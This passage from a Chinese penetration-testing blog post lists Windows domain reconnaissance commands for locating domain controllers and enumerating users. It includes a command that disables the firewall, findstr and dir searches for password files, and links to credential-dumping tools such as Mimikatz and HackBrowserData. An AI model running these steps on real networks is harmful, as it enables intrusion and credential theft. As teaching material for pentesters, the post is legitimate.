+<li><code>net group &quot;domain controllers&quot; /domain</code><strong>需具备 域管理员权限（如Domain Admins组成员）</strong></li>
+</ol>
+</li>
+<li>dns服务<ol>
+<li><code>nslookup  -qt=ns 0day.org</code></li>
+<li><code>ipconfig /all </code>  (看dns服务器)</li>
+<li>查找LDAP和Kerberos的SRV记录<ol>
+<li><code>nslookup -type=SRV _ldap._tcp.dc._msdc.example.com</code></li>
+<li><code>nslookup -type=SRV _kerberos._tcp.example.com</code></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>通过端口服务进行探测<ol>
+<li>扫域内ip，开放以下服务的<ol>
+<li>53 dns</li>
+<li>88 kerberos</li>
+<li>389 ldap</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>自带工具<ol>
+<li>netdom工具<ol>
+<li>netdom query pdc</li>
+</ol>
+</li>
+<li>nltest<ol>
+<li>nltest &#x2F;DCLIST:0day.org</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>插件和其他工具<ol>
+<li>BloodHound（流量太大了）</li>
+</ol>
+</li>
+</ol>
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/9.jpeg"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net config workstation   //查询当前登陆域及登录用户信息</span><br><span class="line"></span><br><span class="line">时间服务</span><br><span class="line">net <span class="keyword">time</span> /domain         //利用同步时间获取主域名，其实这个就是主域的计算机名，再通过nslookup或ping命令来获取主域的IP地址</span><br><span class="line"></span><br><span class="line">dns服务</span><br><span class="line">ipconfig /all            //判断存在域-dns 有域的有dns后缀，无域的无dns后缀</span><br><span class="line">nslookup -qt=ns xie.com  //如果知道域名为 xie.com，则可以使用如下 nslookup 命令查询</span><br><span class="line"></span><br><span class="line">domain controller主机</span><br><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain   //查看 domain controllers 组</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-域内角色"><a href="#3-域内角色" class="headerlink" title="3.域内角色"></a>3.域内角色</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据用户名(<span class="built_in">whoami</span>)，计算机名(hostname)，IP地址、端口扫描等多方位去分析定性</span><br><span class="line">DMZ区、办公区、生产区、核心DB、核心业务区等等；</span><br><span class="line">WEB服务器、开发服务器、文件服务器、代理服务器、DNS服务器、数据储存服务器等；</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-其他信息"><a href="#4-其他信息" class="headerlink" title="4.其他信息"></a>4.其他信息</h4><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><h6 id="Fscan"><a href="#Fscan" class="headerlink" title="Fscan"></a>Fscan</h6><p>   Fscan C2自带功能等，但是如果对方启用了防火墙，会出现明明开放了1433端口，但是却探测不到的问题，而这个spn技术能完美解决这个问题(默认防火墙白名单)  </p>
+<h6 id="setspn技术"><a href="#setspn技术" class="headerlink" title="setspn技术"></a>setspn技术</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*     //判定域下面有哪些主机及服务器并且都开了什么常见服务。</span><br><span class="line">setspn -T god.org -q */*    //指定域名</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">见上图命令集合：</span><br><span class="line">查看当前域内的所有机器，</span><br><span class="line">查看当前域中的所有账户名，</span><br><span class="line">查看当前域内的所有组名，</span><br><span class="line">查看到当前域所在的网段，</span><br><span class="line">查看域内所有的web站点，</span><br><span class="line">查看当前域中的服务器，</span><br><span class="line">域内用户信息</span><br><span class="line">Domain Admins :域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers :域内机器</span><br><span class="line">Domain Controllers :域控制器</span><br><span class="line">Domain Users :域用户</span><br><span class="line">Domain Guest : 域访客，权限低</span><br><span class="line">Enterprise Admins ：企业系统管理员用户</span><br><span class="line">例：net <span class="string">&quot;Domain users&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config //查看防火墙策略</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  //关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<h5 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist //把结果放到杀软识别网站或者工具即可</span><br></pre></td></tr></table></figure>
+
+<h5 id="密码凭据-系统-工具-网站-网络"><a href="#密码凭据-系统-工具-网站-网络" class="headerlink" title="密码凭据-系统&amp;工具&amp;网站&amp;网络"></a>密码凭据-系统&amp;工具&amp;网站&amp;网络</h5><h6 id="系统凭据-Mimikatz"><a href="#系统凭据-Mimikatz" class="headerlink" title="系统凭据 Mimikatz"></a>系统凭据 Mimikatz</h6><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<h6 id="浏览器存储-HackBrowserData"><a href="#浏览器存储-HackBrowserData" class="headerlink" title="浏览器存储 HackBrowserData"></a>浏览器存储 HackBrowserData</h6><p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
+<h6 id="第三方工具存储-SharpDecryptPwd"><a href="#第三方工具存储-SharpDecryptPwd" class="headerlink" title="第三方工具存储 SharpDecryptPwd"></a>第三方工具存储 SharpDecryptPwd</h6><p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p>
+<h6 id="Web应用相关配置-见具体Web程序"><a href="#Web应用相关配置-见具体Web程序" class="headerlink" title="Web应用相关配置 见具体Web程序"></a>Web应用相关配置 见具体Web程序</h6><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA">https://mp.weixin.qq.com/s/SDu4rw35-Atu5fiaNhwqrA</a></p>
+<h6 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">使用命令搜集各类敏感密码配置文件</span><br><span class="line"><span class="built_in">dir</span> /b /s user.*,pass.*,config.*,username.*,password.*</span><br><span class="line"></span><br><span class="line">使用命令查找某个文件的某个字段</span><br><span class="line">findstr /c:<span class="string">&quot;user&quot;</span> /c:<span class="string">&quot;pass&quot;</span> /si *.txt</span><br><span class="line"></span><br><span class="line">使用命令找出所有包含 password 的文件</span><br><span class="line">findstr /si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">1.站点源码备份文件、数据库备份文件等</span><br><span class="line">2.连接工具存储密码，xshell,Navicat等</span><br><span class="line">3.浏览器保存密码、浏览器Cookies</span><br><span class="line">4.其他用户会话、3389和ipc$连接记录、回收站内容</span><br><span class="line">5.Windows 保存的WIFI密码</span><br><span class="line">6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-自动化工具"><a href="#5-自动化工具" class="headerlink" title="5.自动化工具"></a>5.自动化工具</h4><h5 id="本机-searchall"><a href="#本机-searchall" class="headerlink" title="本机-searchall"></a>本机-searchall</h5><p> 快速搜索服务器中的有关敏感信息还有浏览器的账户密码  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchall64.exe search -p 指定路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png"><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/12.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchall64.exe browser -b 指定的浏览器或者all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/13.png">\</p>
+<h5 id="本机-Pillager"><a href="#本机-Pillager" class="headerlink" title="本机-Pillager"></a>本机-Pillager</h5><p> 适用于后渗透期间的信息收集工具，可以收集目标机器上敏感信息  <a target="_blank" rel="noopener" href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p>
+<p> 支持浏览器和各种工具的信息收集  </p>
+<h5 id="打点-Fscan"><a href="#打点-Fscan" class="headerlink" title="打点-Fscan"></a>打点-Fscan</h5><p> FScan内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+<h5 id="综合-ADfind"><a href="#综合-ADfind" class="headerlink" title="综合-ADfind"></a>综合-ADfind</h5><p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/adfind/">https://www.joeware.net/freetools/tools/adfind/</a></p>
+<h6 id="域控查询"><a href="#域控查询" class="headerlink" title="域控查询"></a>域控查询</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc dclist</span><br><span class="line">Adfind.exe -schema -s base objectversion</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/14.png"></p>
+<h6 id="域用户查询"><a href="#域用户查询" class="headerlink" title="域用户查询"></a>域用户查询</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -<span class="built_in">users</span> name</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/15.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc u:webadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/16.png"></p>
+<h6 id="域用户组查询"><a href="#域用户组查询" class="headerlink" title="域用户组查询"></a>域用户组查询</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -f <span class="string">&quot;objectClass=group&quot;</span></span><br><span class="line">Adfind.exe -f <span class="string">&quot;objectClass=group&quot;</span> -dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/17.png"></p>
+<h6 id="查询域中计算机信息"><a href="#查询域中计算机信息" class="headerlink" title="查询域中计算机信息"></a>查询域中计算机信息</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -f <span class="string">&quot;objectcategory=computer&quot;</span>  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/18.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f <span class="string">&quot;objectcategory=computer&quot;</span> dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/19.png"></p>
+<h6 id="查询所有GPO"><a href="#查询所有GPO" class="headerlink" title="查询所有GPO"></a>查询所有GPO</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc gpodmp</span><br></pre></td></tr></table></figure>
+
+<h5 id="综合-BloodHound-可视化（提供域渗透思路）"><a href="#综合-BloodHound-可视化（提供域渗透思路）" class="headerlink" title="综合-BloodHound -可视化（提供域渗透思路）"></a>综合-BloodHound -可视化（提供域渗透思路）</h5><p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+<p><font style="color:rgb(51,51,51);">SharpHound.exe </font><font style="color:rgb(152,26,26);">-</font><font style="color:rgb(51,51,51);">c all </font><font style="color:rgb(255,0,0);">进行数据采集。</font></p>
+<p>安装使用：</p>
+<p>windows: <a target="_blank" rel="noopener" href="https://cn-sec.com/archives/146548.html">https://cn-sec.com/archives/146548.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/7aba0c03.html">https://hundredsu.github.io/post/7aba0c03.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/post/7f69f64e.html" title="SQL注入绕waf总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL注入绕waf总结</div></div><div class="info-2"><div class="info-item-1"> 参考文章 最新的bypass安全狗 https://mp.weixin.qq.com/s/6xm-khZbQG0BFlGaVkI5Fw 安全狗配置 https://blog.csdn.net/qq_43696276&#x2F;article&#x2F;details&#x2F;125929984  这里我就不用常见的脏数据和并发了，有不对的地方可以直接指出 绕waf前的准备判断是否存在SQL注入 判断数据库类型  ‘&#x3D;1+1*0&#x3D;’1 有数据，非Oracle，下一步 报错，Oracle(需要from dual)   ‘&#x3D;’1’&#x3D;1.0||’ 有数据，mysql&#x2F;mssql（隐式类型转换）下一步 无数据，postgreSQL    mysql支持 mssql...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E9%98%B6%E6%AE%B5%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">不同阶段的信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B6%E6%AE%B5"><span class="toc-number">1.1.</span> <span class="toc-text">权限提升阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E9%98%B6%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">横向移动阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%98%B6%E6%AE%B5"><span class="toc-number">1.3.</span> <span class="toc-text">权限维持阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">1.4.</span> <span class="toc-text">思维导图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LINUX"><span class="toc-number">1.5.1.</span> <span class="toc-text">LINUX</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">系统信息 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">用户和组信息 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">其他信息 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">网络信息 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">主机信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.5.1.6.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-1"><span class="toc-number">1.5.1.7.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.8.</span> <span class="toc-text">进程信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.9.</span> <span class="toc-text">计划任务信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.10.</span> <span class="toc-text">操作记录信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.11.</span> <span class="toc-text">web信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.1.12.</span> <span class="toc-text">数据库信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WIN"><span class="toc-number">1.5.2.</span> <span class="toc-text">WIN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">主机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.2.1.1.</span> <span class="toc-text">网络信息收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.2.</span> <span class="toc-text">主机路由信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ARP%E7%BC%93%E5%AD%98"><span class="toc-number">1.5.2.1.3.</span> <span class="toc-text">ARP缓存</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E7%BC%93%E5%AD%98%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.4.</span> <span class="toc-text">DNS缓存信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Hosts%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.5.</span> <span class="toc-text">Hosts文件信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.6.</span> <span class="toc-text">端口连接信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.7.</span> <span class="toc-text">进程相关信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AV%E9%98%B2%E6%8A%A4%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.8.</span> <span class="toc-text">AV防护信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81"><span class="toc-number">1.5.2.1.9.</span> <span class="toc-text">补丁</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">配置信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#web%E4%BF%A1%E6%81%AF-1"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text">web信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.2.2.</span> <span class="toc-text">文档信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BE%AE%E4%BF%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.2.3.</span> <span class="toc-text">微信信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%B5%84%E4%BA%A7"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">网络资产</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">密码凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.2.4.1.</span> <span class="toc-text">主机密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.2.4.2.</span> <span class="toc-text">浏览器密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.2.4.3.</span> <span class="toc-text">文档密码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">用户操作相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RDP%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%EF%BC%88%E7%9C%8B%E8%B0%A2%E5%85%AC%E5%AD%90%E7%9A%84%E8%A1%A5%E5%85%85%E5%AE%8C%EF%BC%89"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">RDP操作相关（看谢公子的补充完）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E7%97%95%E8%BF%B9%E7%9B%B8%E5%85%B3"><span class="toc-number">1.5.2.7.</span> <span class="toc-text">日志痕迹相关</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.3.</span> <span class="toc-text">域渗透的信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">1.基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">2.域内定位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%9F%9F%E5%86%85%E8%A7%92%E8%89%B2"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">3.域内角色</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">4.其他信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.3.4.1.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Fscan"><span class="toc-number">1.5.3.4.1.1.</span> <span class="toc-text">Fscan</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#setspn%E6%8A%80%E6%9C%AF"><span class="toc-number">1.5.3.4.1.2.</span> <span class="toc-text">setspn技术</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.5.3.4.2.</span> <span class="toc-text">防火墙</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.5.3.4.3.</span> <span class="toc-text">杀毒软件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%87%AD%E6%8D%AE-%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%AB%99-%E7%BD%91%E7%BB%9C"><span class="toc-number">1.5.3.4.4.</span> <span class="toc-text">密码凭据-系统&amp;工具&amp;网站&amp;网络</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%AD%E6%8D%AE-Mimikatz"><span class="toc-number">1.5.3.4.4.1.</span> <span class="toc-text">系统凭据 Mimikatz</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" 